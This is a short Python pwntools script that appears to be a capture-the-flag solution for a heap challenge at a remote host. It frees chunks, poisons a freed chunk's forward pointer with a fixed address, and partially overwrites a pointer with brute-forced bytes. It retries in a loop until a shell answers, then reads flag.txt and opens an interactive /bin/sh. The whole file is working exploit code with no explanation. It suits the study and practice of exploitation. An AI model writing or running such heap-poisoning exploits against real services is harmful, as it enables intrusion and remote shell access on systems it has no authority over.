from pwn import *
import sys

def add(size,mes):
	p.recvuntil('>',timeout=0.8)
	p.sendline('1')
	p.recvuntil('>',timeout=0.8)
	p.sendline(str(size))
	p.recvuntil('>',timeout=0.8)
	p.send(mes)
def dele(idx):
	p.recvuntil('>',timeout=0.8)
	p.sendline('2')
	p.recvuntil('>',timeout=0.8)
	p.sendline(str(idx))
def edit(idx,mes):
	p.recvuntil('>',timeout=0.8)
	p.sendline('3')
	p.recvuntil('>',timeout=0.8)
	p.sendline(str(idx))
	p.recvuntil('>',timeout=0.8)
	p.send(mes)

while True:
	try:
		p=remote('ctf1.linkedbyx.com',10266)
		add(0x30,'0000')
		add(0x30,'1111')
		dele(0)
		dele(1)
		edit(1,p64(0x60102a))
		add(0x30,'2222')
		add(0x30,'\x00'*(0x48-0x2a-0x10)+'\xa4\x82\x72')
		sleep(0.8)
		p.sendline('echo pwn')
		isReply = p.recvuntil('pwn',timeout=0.8)
		if not isReply:
			continue
		p.sendline('cat flag.txt')
		info(str(p.recv(timeout=1)))
		p.sendline('/bin/sh')
		p.interactive()
	except:
		p.close()
		continue
